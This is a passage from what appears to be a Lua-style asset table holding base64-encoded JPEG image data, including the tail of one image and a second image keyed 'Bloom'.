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]],
["Bloom"] = [[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